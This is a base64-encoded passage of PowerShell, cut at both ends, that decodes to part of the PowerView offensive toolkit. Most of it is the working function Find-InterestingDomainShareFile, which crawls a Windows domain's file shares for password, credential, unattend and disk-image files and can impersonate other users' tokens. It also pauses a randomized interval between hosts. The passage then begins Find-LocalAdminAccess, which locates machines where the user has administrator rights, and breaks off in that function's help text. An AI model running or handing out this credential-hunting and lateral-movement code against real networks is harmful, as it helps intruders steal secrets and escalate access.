RTCgpQb3dlclZpZXcuRm91bmRGaWxlCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRm91bmRGaWxlJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdETlNIb3N0TmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdPcGVyYXRpbmdTeXN0ZW0nKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck9wZXJhdGluZ1N5c3RlbSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NlcnZpY2VQYWNrJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTZXJ2aWNlUGFjaywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NpdGVOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTaXRlTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NlYXJjaFRlcm1zJywgJ1Rlcm1zJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRJbmNsdWRlID0gQCgnKnBhc3N3b3JkKicsICcqc2Vuc2l0aXZlKicsICcqYWRtaW4qJywgJypsb2dpbionLCAnKnNlY3JldConLCAndW5hdHRlbmQqLnhtbCcsICcqLnZtZGsnLCAnKmNyZWRzKicsICcqY3JlZGVudGlhbConLCAnKi5jb25maWcnKSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbVmFsaWRhdGVQYXR0ZXJuKCdcXFxcJyldCiAgICAgICAgW0FsaWFzKCdTaGFyZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkU2hhcmVQYXRoLAoKICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJEV4Y2x1ZGVkU2hhcmVzID0gQCgnQyQnLCAnQWRtaW4kJywgJ1ByaW50JCcsICdJUEMkJyksCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRMYXN0QWNjZXNzVGltZSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJExhc3RXcml0ZVRpbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRDcmVhdGlvblRpbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdPZmZpY2VEb2NzJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkT2ZmaWNlRG9jcywKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZyZXNoRVhFcycpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZyZXNoRVhFcywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICREZWxheSA9IDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDAuMCwgMS4wKV0KICAgICAgICBbRG91YmxlXQogICAgICAgICRKaXR0ZXIgPSAuMywKCiAgICAgICAgW0ludF0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDApXQogICAgICAgICRUaHJlYWRzID0gMjAKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnZG5zaG9zdG5hbWUnCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyRG9tYWluJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJENvbXB1dGVyRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlckxEQVBGaWx0ZXInXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJENvbXB1dGVyTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTZWFyY2hCYXNlJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRDb21wdXRlclNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyT3BlcmF0aW5nU3lzdGVtJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ09wZXJhdGluZ1N5c3RlbSddID0gJE9wZXJhdGluZ1N5c3RlbSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTZXJ2aWNlUGFjayddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2aWNlUGFjayddID0gJFNlcnZpY2VQYWNrIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNpdGVOYW1lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NpdGVOYW1lJ10gPSAkU2l0ZU5hbWUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck5hbWUnXSkgewogICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gJENvbXB1dGVyTmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIFF1ZXJ5aW5nIGNvbXB1dGVycyBpbiB0aGUgZG9tYWluJwogICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gR2V0LURvbWFpbkNvbXB1dGVyIEBDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgZG5zaG9zdG5hbWUKICAgICAgICB9CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIFRhcmdldENvbXB1dGVycyBsZW5ndGg6ICQoJFRhcmdldENvbXB1dGVycy5MZW5ndGgpIgogICAgICAgIGlmICgkVGFyZ2V0Q29tcHV0ZXJzLkxlbmd0aCAtZXEgMCkgewogICAgICAgICAgICB0aHJvdyAnW0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIE5vIGhvc3RzIGZvdW5kIHRvIGVudW1lcmF0ZScKICAgICAgICB9CgogICAgICAgICMgdGhlIGhvc3QgZW51bWVyYXRpb24gYmxvY2sgd2UncmUgdXNpbmcgdG8gZW51bWVyYXRlIGFsbCBzZXJ2ZXJzCiAgICAgICAgJEhvc3RFbnVtQmxvY2sgPSB7CiAgICAgICAgICAgIFBhcmFtKCRDb21wdXRlck5hbWUsICRJbmNsdWRlLCAkRXhjbHVkZWRTaGFyZXMsICRPZmZpY2VEb2NzLCAkRXhjbHVkZUhpZGRlbiwgJEZyZXNoRVhFcywgJENoZWNrV3JpdGVBY2Nlc3MsICRUb2tlbkhhbmRsZSkKCiAgICAgICAgICAgIGlmICgkVG9rZW5IYW5kbGUpIHsKICAgICAgICAgICAgICAgICMgaW1wZXJzb25hdGUgdGhlIHRoZSB0b2tlbiBwcm9kdWNlZCBieSBMb2dvblVzZXIoKS9JbnZva2UtVXNlckltcGVyc29uYXRpb24KICAgICAgICAgICAgICAgICROdWxsID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1Ub2tlbkhhbmRsZSAkVG9rZW5IYW5kbGUgLVF1aWV0CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CgogICAgICAgICAgICAgICAgJFNlYXJjaFNoYXJlcyA9IEAoKQogICAgICAgICAgICAgICAgaWYgKCRUYXJnZXRDb21wdXRlci5TdGFydHNXaXRoKCdcXCcpKSB7CiAgICAgICAgICAgICAgICAgICAgIyBpZiBhIHNoYXJlIGlzIHBhc3NlZCBhcyB0aGUgc2VydmVyCiAgICAgICAgICAgICAgICAgICAgJFNlYXJjaFNoYXJlcyArPSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRVcCA9IFRlc3QtQ29ubmVjdGlvbiAtQ291bnQgMSAtUXVpZXQgLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICBpZiAoJFVwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgZ2V0IHRoZSBzaGFyZXMgZm9yIHRoaXMgaG9zdCBhbmQgZGlzcGxheSB3aGF0IHdlIGZpbmQKICAgICAgICAgICAgICAgICAgICAgICAgJFNoYXJlcyA9IEdldC1OZXRTaGFyZSAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkU2hhcmUgaW4gJFNoYXJlcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNoYXJlTmFtZSA9ICRTaGFyZS5OYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUGF0aCA9ICdcXCcrJFRhcmdldENvbXB1dGVyKydcJyskU2hhcmVOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIG1ha2Ugc3VyZSB3ZSBnZXQgYSByZWFsIHNoYXJlIG5hbWUgYmFjawogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCgkU2hhcmVOYW1lKSAtYW5kICgkU2hhcmVOYW1lLlRyaW0oKSAtbmUgJycpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBza2lwIHRoaXMgc2hhcmUgaWYgaXQncyBpbiB0aGUgZXhjbHVkZSBsaXN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRFeGNsdWRlZFNoYXJlcyAtTm90Q29udGFpbnMgJFNoYXJlTmFtZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGNoZWNrIGlmIHRoZSB1c2VyIGhhcyBhY2Nlc3MgdG8gdGhpcyBwYXRoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9IFtJTy5EaXJlY3RvcnldOjpHZXRGaWxlcygkUGF0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hTaGFyZXMgKz0gJFBhdGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbIV0gTm8gYWNjZXNzIHRvICRQYXRoIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIEZvckVhY2ggKCRTaGFyZSBpbiAkU2VhcmNoU2hhcmVzKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2VhcmNoaW5nIHNoYXJlOiAkU2hhcmUiCiAgICAgICAgICAgICAgICAgICAgJFNlYXJjaEFyZ3MgPSBAewogICAgICAgICAgICAgICAgICAgICAgICAnUGF0aCcgPSAkU2hhcmUKICAgICAgICAgICAgICAgICAgICAgICAgJ0luY2x1ZGUnID0gJEluY2x1ZGUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRPZmZpY2VEb2NzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hBcmdzWydPZmZpY2VEb2NzJ10gPSAkT2ZmaWNlRG9jcwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJEZyZXNoRVhFcykgewogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoQXJnc1snRnJlc2hFWEVzJ10gPSAkRnJlc2hFWEVzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkTGFzdEFjY2Vzc1RpbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaEFyZ3NbJ0xhc3RBY2Nlc3NUaW1lJ10gPSAkTGFzdEFjY2Vzc1RpbWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRMYXN0V3JpdGVUaW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hBcmdzWydMYXN0V3JpdGVUaW1lJ10gPSAkTGFzdFdyaXRlVGltZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJENyZWF0aW9uVGltZSkgewogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoQXJnc1snQ3JlYXRpb25UaW1lJ10gPSAkQ3JlYXRpb25UaW1lCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkQ2hlY2tXcml0ZUFjY2VzcykgewogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoQXJnc1snQ2hlY2tXcml0ZUFjY2VzcyddID0gJENoZWNrV3JpdGVBY2Nlc3MKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgRmluZC1JbnRlcmVzdGluZ0ZpbGUgQFNlYXJjaEFyZ3MKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCRUb2tlbkhhbmRsZSkgewogICAgICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZgogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAkTG9nb25Ub2tlbiA9ICROdWxsCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlbGF5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snU3RvcE9uU3VjY2VzcyddKSB7CiAgICAgICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwgLVF1aWV0CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgIyBvbmx5IGlnbm9yZSB0aHJlYWRpbmcgaWYgLURlbGF5IGlzIHBhc3NlZAogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlbGF5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snU3RvcE9uU3VjY2VzcyddKSB7CgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1JbnRlcmVzdGluZ0RvbWFpblNoYXJlRmlsZV0gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiAkKCRUYXJnZXRDb21wdXRlcnMuY291bnQpIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1JbnRlcmVzdGluZ0RvbWFpblNoYXJlRmlsZV0gRGVsYXk6ICREZWxheSwgSml0dGVyOiAkSml0dGVyIgogICAgICAgICAgICAkQ291bnRlciA9IDAKICAgICAgICAgICAgJFJhbmRObyA9IE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbQoKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRUYXJnZXRDb21wdXRlcnMpIHsKICAgICAgICAgICAgICAgICRDb3VudGVyID0gJENvdW50ZXIgKyAxCgogICAgICAgICAgICAgICAgIyBzbGVlcCBmb3Igb3VyIHNlbWktcmFuZG9taXplZCBpbnRlcnZhbAogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFJhbmROby5OZXh0KCgxLSRKaXR0ZXIpKiREZWxheSwgKDErJEppdHRlcikqJERlbGF5KQoKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlXSBFbnVtZXJhdGluZyBzZXJ2ZXIgJFRhcmdldENvbXB1dGVyICgkQ291bnRlciBvZiAkKCRUYXJnZXRDb21wdXRlcnMuY291bnQpKSIKICAgICAgICAgICAgICAgIEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtQXJndW1lbnRMaXN0ICRUYXJnZXRDb21wdXRlciwgJEluY2x1ZGUsICRFeGNsdWRlZFNoYXJlcywgJE9mZmljZURvY3MsICRFeGNsdWRlSGlkZGVuLCAkRnJlc2hFWEVzLCAkQ2hlY2tXcml0ZUFjY2VzcywgJExvZ29uVG9rZW4KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIFVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHM6ICRUaHJlYWRzIgoKICAgICAgICAgICAgIyBpZiB3ZSdyZSB1c2luZyB0aHJlYWRpbmcsIGtpY2sgb2ZmIHRoZSBzY3JpcHQgYmxvY2sgd2l0aCBOZXctVGhyZWFkZWRGdW5jdGlvbgogICAgICAgICAgICAkU2NyaXB0UGFyYW1zID0gQHsKICAgICAgICAgICAgICAgICdJbmNsdWRlJyA9ICRJbmNsdWRlCiAgICAgICAgICAgICAgICAnRXhjbHVkZWRTaGFyZXMnID0gJEV4Y2x1ZGVkU2hhcmVzCiAgICAgICAgICAgICAgICAnT2ZmaWNlRG9jcycgPSAkT2ZmaWNlRG9jcwogICAgICAgICAgICAgICAgJ0V4Y2x1ZGVIaWRkZW4nID0gJEV4Y2x1ZGVIaWRkZW4KICAgICAgICAgICAgICAgICdGcmVzaEVYRXMnID0gJEZyZXNoRVhFcwogICAgICAgICAgICAgICAgJ0NoZWNrV3JpdGVBY2Nlc3MnID0gJENoZWNrV3JpdGVBY2Nlc3MKICAgICAgICAgICAgICAgICdUb2tlbkhhbmRsZScgPSAkTG9nb25Ub2tlbgogICAgICAgICAgICB9CgogICAgICAgICAgICAjIGlmIHdlJ3JlIHVzaW5nIHRocmVhZGluZywga2ljayBvZmYgdGhlIHNjcmlwdCBibG9jayB3aXRoIE5ldy1UaHJlYWRlZEZ1bmN0aW9uIHVzaW5nIHRoZSAkSG9zdEVudW1CbG9jayArIHBhcmFtcwogICAgICAgICAgICBOZXctVGhyZWFkZWRGdW5jdGlvbiAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcnMgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1TY3JpcHRQYXJhbWV0ZXJzICRTY3JpcHRQYXJhbXMgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBGaW5kLUxvY2FsQWRtaW5BY2Nlc3Mgewo8IwouU1lOT1BTSVMKCkZpbmRzIG1hY2hpbmVzIG9uIHRoZSBsb2NhbCBkb21haW4gd2hlcmUgdGhlIGN1cnJlbnQgdXNlciBoYXMgbG9jYWwgYWRtaW5pc3RyYXRvciBhY2Nlc3MuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5Db21wdXRlciwgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLCBJbnZva2UtUmV2ZXJ0VG9TZWxmLCBUZXN0LUFkbWluQWNjZXNzLCBOZXctVGhyZWFkZWRGdW5jdGlvbiAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gZW51bWVyYXRlcyBhbGwgbWFjaGluZXMgb24gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluCnVzaW5nIEdldC1Eb21haW5Db21wdXRlciwgYW5kIGZvciBlYWNoIGNvbXB1dGVyIGl0IGNoZWNrcyBpZiB0aGUgY3VycmVudCB1c2VyCmhhcyBsb2NhbCBhZG1pbmlzdHJhdG9yIGFjY2VzcyB1c2luZyBUZXN0LUFkbWluQWNjZXNzLiBJZiAtQ3JlZGVudGlhbCBpcyBwYXNzZWQsCnRoZW4gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIGlzIHVzZWQgdG8gaW1wZXJzb25hdGUgdGhlIHNwZWNpZmllZCB1c2VyCmJlZm9yZSBlbnVtZXJhdGlvbiwgcmV2ZXJ0aW5nIGFmdGVyIHdpdGggSW52b2tlLVJldmVydFRvU2VsZi4KCklkZWEgYWRhcHRlZCBmcm9tIHRoZSBsb2NhbF9hZG1pbl9zZWFyY2hfZW51bSBwb3N0IG1vZHVsZSBpbiBNZXRhc3Bsb2l0IHdyaXR0ZW4gYnk6CiAgICAnQnJhbmRvbiBNY0Nhbm4gInpla25veCIgPGJtY2Nhbm5bYXRdYWNjdXZhbnQuY29tPicKICAgICdUaG9tYXMgTWNDYXJ0aHkgInNtaWxpbmdyYWNjb29uIiA8c21pbGluZ3JhY2Nvb25bYXRdZ21haWwuY29tPicKICAgICdSb3ljZSBEYXZpcyAicjNkeSIgPHJkYXZpc1thdF1hY2N1dmFudC5jb20+JwoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyBhbiBhcnJheSBvZiBvbmUgb3IgbW9yZSBob3N0cyB0byBlbnVtZXJhdGUsIHBhc3NhYmxlIG9uIHRoZSBwaXBlbGluZS4KSWYgLUNvbXB1dGVyTmFtZSBpcyBub3QgcGFzc2VkLCB0aGUgZGVmYXVsdCBiZWhhdmlvciBpcyB0byBlbnVtZXJhdGUgYWxsIG1hY2hpbmVzCmluIHRoZSBkb21haW4gcmV0dXJuZWQgYnkgR2V0LURvbWFpbkNvbXB1dGVyLgoKLlBBUkFNRVRFUiBDb21wdXRlckRvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gcXVlcnkgZm9yIGNvbXB1dGVycywgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBDb21wdXRlckxEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gc2VhcmNoIGZvciBjb21wdXRlciBvYmplY3RzLgoKLlBBUkFNRVRFUiBDb21wdXRlclNlYXJjaEJhc2UKClNwZWNpZmllcyB0aGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2ggZm9yIGNvbXB1dGVycywKZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIi4gVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBDb21wdXRlck9wZXJhdGluZ1N5c3RlbQoKU2VhcmNoIGNvbXB1dGVycyB3aXRoI